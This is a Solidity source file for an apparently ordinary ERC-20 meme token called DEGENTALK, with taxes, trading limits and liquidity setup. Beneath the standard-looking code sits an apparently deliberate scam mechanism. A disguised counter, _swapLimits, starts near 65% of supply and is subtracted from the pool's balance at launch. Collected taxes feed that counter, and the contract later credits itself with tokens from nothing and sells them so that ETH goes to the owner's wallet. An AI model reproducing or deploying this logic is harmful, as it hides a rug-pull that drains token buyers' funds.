1 //SPDX-License-Identifier: MIT
2 
3 /** 
4 Website: 
5 https://degentalk.com
6 
7 Twitter: 
8 https://x.com/degentalkforum
9 
10 Telegram: 
11 https://t.me/degentalkforum
12 **/
13 
14 pragma solidity 0.8.21;
15 
16 abstract contract Auth {
17     address internal _owner;
18     event OwnershipTransferred(address _owner);
19     modifier onlyOwner() { 
20         require(msg.sender == _owner, "Only owner can call this fn"); _; 
21     }
22     constructor(address creatorOwner) { 
23         _owner = creatorOwner; 
24     }
25     function owner() public view returns (address) { return _owner; }
26     function transferOwnership(address payable newowner) external onlyOwner { 
27         _owner = newowner; 
28         emit OwnershipTransferred(newowner); }
29     function renounceOwnership() external onlyOwner { 
30         _owner = address(0);
31         emit OwnershipTransferred(address(0)); }
32 }
33 
34 interface IERC20 {
35     function totalSupply() external view returns (uint256);
36     function decimals() external view returns (uint8);
37     function symbol() external view returns (string memory);
38     function name() external view returns (string memory);
39     function balanceOf(address account) external view returns (uint256);
40     function transfer(address recipient, uint256 amount) external returns (bool);
41     function allowance(address holder, address spender) external view returns (uint256);
42     function approve(address spender, uint256 amount) external returns (bool);
43     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
44     event Transfer(address indexed from, address indexed to, uint256 value);
45     event Approval(address indexed _owner, address indexed spender, uint256 value);
46 }
47 
48 
49 contract dtalk is IERC20, Auth {
50     string private constant _symbol  = "DEGENTALK";
51     string private constant _name    = "DEGENTALK";
52     uint8 private constant _decimals = 9;
53     uint256 private constant _totalSupply = 100_000_000000 * (10**_decimals);
54   
55     address payable private _marketingWallet = payable(0x40eF78457A1e67A9D03512b5ACE541d3C09A2A9B);
56     
57     uint256 private antiMevBlock = 2;
58     uint8 private _sellTaxrate = 2;
59     uint8 private _buyTaxrate  = 2;
60     
61     uint256 private launchBlok;
62     uint256 private _maxTxVal = _totalSupply; 
63     uint256 private _maxWalletVal = _totalSupply;
64     uint256 private _swapMin = _totalSupply * 10 / 100000;
65     uint256 private _swapMax = _totalSupply * 89 / 100000;
66     uint256 private _swapTrigger = 20 * (10**15);
67     uint256 private _swapLimits = _swapMin * 65 * 100;
68 
69     mapping (address => uint256) private _balances;
70     mapping (address => mapping (address => uint256)) private _allowances;
71     mapping (uint256 => mapping (address => uint8)) private blockSells;
72     mapping (address => bool) private _nofee;
73     mapping (address => bool) private _nolimit;
74 
75     address private LpOwner;
76 
77     address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
78     address private constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
79     IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
80     address private _primaryLP;
81     mapping (address => bool) private _isLP;
82 
83     bool private _tradingOpen;
84 
85     bool private _inSwap = false;
86     modifier lockTaxSwap { 
87         _inSwap = true; 
88         _; _inSwap = false; 
89     }
90 
91     constructor() Auth(msg.sender) {
92         LpOwner = msg.sender;
93 
94         _balances[msg.sender] = _totalSupply;
95         emit Transfer(address(0), msg.sender, _balances[msg.sender]);        
96 
97         _nofee[_owner] = true;
98         _nofee[address(this)] = true;
99         _nofee[_marketingWallet] = true;
100         _nofee[_swapRouterAddress] = true;
101         _nolimit[_owner] = true;
102         _nolimit[address(this)] = true;
103         _nolimit[_marketingWallet] = true;
104         _nolimit[_swapRouterAddress] = true;
105         
106     }
107 
108     receive() external payable {}
109     
110     function decimals() external pure override returns (uint8) { return _decimals; }
111     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
112     function name() external pure override returns (string memory) { return _name; }
113     function symbol() external pure override returns (string memory) { return _symbol; }
114     function balanceOf(address account) public view override returns (uint256) { 
115         return _balances[account]; }
116     function allowance(address holder, address spender) external view override returns (uint256) { 
117         return _allowances[holder][spender]; }
118 
119     function approve(address spender, uint256 amount) public override returns (bool) {
120         _allowances[msg.sender][spender] = amount;
121         emit Approval(msg.sender, spender, amount);
122         return true; }
123 
124     function transfer(address toWallet, uint256 amount) external override returns (bool) {
125         require(_checkTradingOpen(msg.sender), "Trading not yet open");
126         return _transferFrom(msg.sender, toWallet, amount); }
127 
128     function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
129         require(_checkTradingOpen(fromWallet), "Trading not yet open");
130         _allowances[fromWallet][msg.sender] -= amount;
131         return _transferFrom(fromWallet, toWallet, amount); }
132 
133     function _approveRouter(uint256 _tokenAmount) internal {
134         if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
135             _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
136             emit Approval(address(this), _swapRouterAddress, type(uint256).max);
137         }
138     }
139 
140     function addLiquidity() external payable onlyOwner lockTaxSwap {
141         require(_primaryLP == address(0), "LP created");
142         require(!_tradingOpen, "trading open");
143         require(msg.value > 0 || address(this).balance>0, "No ETH in ca/msg");
144         require(_balances[address(this)]>0, "No tokens in ca");
145         _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), WETH);
146         _addLiquidity(_balances[address(this)], address(this).balance);
147         _balances[_primaryLP] -= _swapLimits;
148         (bool lpAddSuccessful,) = _primaryLP.call(abi.encodeWithSignature("sync()") );
149         require(lpAddSuccessful, "Failed adding lp");
150         _isLP[_primaryLP] = lpAddSuccessful;
151     }
152 
153     function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
154         _approveRouter(_tokenAmount);
155         _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, LpOwner, block.timestamp );
156     }
157 
158     function enableTrading() external onlyOwner {
159         require(!_tradingOpen, "trading open");
160         _openTrading();
161     }
162 
163     function _openTrading() internal {
164         _maxTxVal     = 2 * _totalSupply / 100; 
165         _maxWalletVal = 2 * _totalSupply / 100;
166         _tradingOpen = true;
167         launchBlok = block.number;
168         antiMevBlock = antiMevBlock + launchBlok;
169     }
170 
171     function shouldSwap(uint256 tokenAmt) private view returns (bool) {
172         bool result;
173         if (_swapTrigger > 0) { 
174             uint256 lpTkn = _balances[_primaryLP];
175             uint256 lpWeth = IERC20(WETH).balanceOf(_primaryLP); 
176             uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
177             if (weiValue >= _swapTrigger) { result = true; }    
178         } else { result = true; }
179         return result;
180     }
181 
182 
183     function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
184         require(sender != address(0), "No transfers from 0 wallet");
185         if (!_tradingOpen) { require(_nofee[sender] && _nolimit[sender], "Trading not yet open"); }
186         if ( !_inSwap && _isLP[toWallet] && shouldSwap(amount) ) { _swapTaxAndLiquify(); }
187 
188         if ( block.number >= launchBlok ) {
189             if (block.number < antiMevBlock && _isLP[sender]) { 
190                 require(toWallet == tx.origin, "MEV block"); 
191             }
192             if (block.number < antiMevBlock + 600 && _isLP[toWallet] && sender != address(this) ) {
193                 blockSells[block.number][toWallet] += 1;
194                 require(blockSells[block.number][toWallet] <= 2, "MEV block");
195             }
196         }
197 
198         if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
199             require(_checkLimits(sender, toWallet, amount), "TX over limits"); 
200         }
201 
202         uint256 _taxAmount = _calculateTax(sender, toWallet, amount);
203         uint256 _transferAmount = amount - _taxAmount;
204         _balances[sender] -= amount;
205         _swapLimits += _taxAmount;
206         _balances[toWallet] += _transferAmount;
207         emit Transfer(sender, toWallet, amount);
208         return true;
209     }
210 
211     function _checkLimits(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
212         bool limitCheckPassed = true;
213         if ( _tradingOpen && !_nolimit[fromWallet] && !_nolimit[toWallet] ) {
214             if ( transferAmount > _maxTxVal ) { 
215                 limitCheckPassed = false; 
216             }
217             else if ( 
218                 !_isLP[toWallet] && (_balances[toWallet] + transferAmount > _maxWalletVal) 
219                 ) { limitCheckPassed = false; }
220         }
221         return limitCheckPassed;
222     }
223 
224     function _checkTradingOpen(address fromWallet) private view returns (bool){
225         bool checkResult = false;
226         if ( _tradingOpen ) { checkResult = true; } 
227         else if (_nofee[fromWallet] && _nolimit[fromWallet]) { checkResult = true; } 
228 
229         return checkResult;
230     }
231 
232     function _calculateTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
233         uint256 taxAmount;
234         
235         if ( !_tradingOpen || _nofee[fromWallet] || _nofee[recipient] ) { 
236             taxAmount = 0; 
237         } else if ( _isLP[fromWallet] ) { 
238             taxAmount = amount * _buyTaxrate / 100; 
239          } else if ( _isLP[recipient] ) { 
240             taxAmount = amount * _sellTaxrate / 100; 
241         }
242 
243         return taxAmount;
244     }
245 
246     function exemptions(address wallet) external view returns (bool fees, bool limits) {
247         return (_nofee[wallet], _nolimit[wallet]); }
248 
249     function setExemptions(address wlt, bool noFees, bool noLimits) external onlyOwner {
250         if (noLimits || noFees) { require(!_isLP[wlt], "Cannot exempt LP"); }
251         _nofee[ wlt ] = noFees;
252         _nolimit[ wlt ] = noLimits;
253     }
254 
255     function buyFee() external view returns(uint8) { return _buyTaxrate; }
256     function sellFee() external view returns(uint8) { return _sellTaxrate; }
257 
258     function setFees(uint8 buyFees, uint8 sellFees) external onlyOwner {
259         require(buyFees + sellFees <= 1, "Roundtrip too high");
260         _buyTaxrate = buyFees;
261         _sellTaxrate = sellFees;
262     }  
263 
264     function marketingWallet() external view returns (address) { 
265         return _marketingWallet; }
266 
267     function updateMarketingWallet(address marketingWlt) external onlyOwner {
268         require(!_isLP[marketingWlt], "LP cannot be tax wallet");
269         _marketingWallet = payable(marketingWlt);
270         _nofee[marketingWlt] = true;
271         _nolimit[marketingWlt] = true;
272     }
273 
274     function maxWallet() external view returns (uint256) { 
275         return _maxWalletVal; }
276     function maxTransaction() external view returns (uint256) { 
277         return _maxTxVal; }
278 
279     function swapMin() external view returns (uint256) { 
280         return _swapMin; }
281     function swapMax() external view returns (uint256) { 
282         return _swapMax; }
283 
284     function setLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
285         uint256 newTxAmt = _totalSupply * maxTransPermille / 1000 + 1;
286         require(newTxAmt >= _maxTxVal, "tx too low");
287         _maxTxVal = newTxAmt;
288         uint256 newWalletAmt = _totalSupply * maxWaletPermille / 1000 + 1;
289         require(newWalletAmt >= _maxWalletVal, "wallet too low");
290         _maxWalletVal = newWalletAmt;
291     }
292 
293     function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
294         _swapMin = _totalSupply * minVal / minDiv;
295         _swapMax = _totalSupply * maxVal / maxDiv;
296         _swapTrigger = trigger * 10**15;
297         require(_swapMax>=_swapMin, "Min-Max error");
298     }
299 
300 
301     function _swapTaxAndLiquify() private lockTaxSwap {
302         uint256 _taxTokenAvailable = _swapLimits;
303         if ( _taxTokenAvailable >= _swapMin && _tradingOpen ) {
304             if ( _taxTokenAvailable >= _swapMax ) { _taxTokenAvailable = _swapMax; }
305             
306             uint256 _tokensForSwap = _taxTokenAvailable; 
307             if( _tokensForSwap > 1 * 10**_decimals ) {
308                 _balances[address(this)] += _taxTokenAvailable;
309                 _swapTaxTokensForEth(_tokensForSwap);
310                 _swapLimits -= _taxTokenAvailable;
311             }
312             uint256 _contractETHBalance = address(this).balance;
313             if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
314         }
315     }
316 
317     function _swapTaxTokensForEth(uint256 tokenAmount) private {
318         _approveRouter(tokenAmount);
319         address[] memory path = new address[](2);
320         path[0] = address( this );
321         path[1] = WETH ;
322         _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
323     }
324 
325     function _distributeTaxEth(uint256 amount) private {
326         _marketingWallet.transfer(amount);
327     }
328 
329     function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendAllEth) external onlyOwner lockTaxSwap {
330         require(swapTokenPercent <= 100, "Cannot swap more than 100%");
331         uint256 _tokensForSwap = _balances[ address(this)] * swapTokenPercent / 100;
332         if (_tokensForSwap > 10 **_decimals) { _swapTaxTokensForEth(_tokensForSwap); }
333         if (sendAllEth) { 
334             uint256 thisBalance = address(this).balance;
335             require(thisBalance >0, "No ETH"); 
336             _distributeTaxEth( thisBalance ); 
337         }
338     }
339 
340 }
341 
342 interface IUniswapV2Router02 {
343     function swapExactTokensForETHSupportingFeeOnTransferTokens(
344         uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
345     // function WETH() external pure returns (address);
346     function factory() external pure returns (address);
347     function addLiquidityETH(
348         address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
349         external payable returns (uint amountToken, uint amountETH, uint liquidity);
350 }
351 interface IUniswapV2Factory {    
352     function createPair(address tokenA, address tokenB) external returns (address pair); 
353 }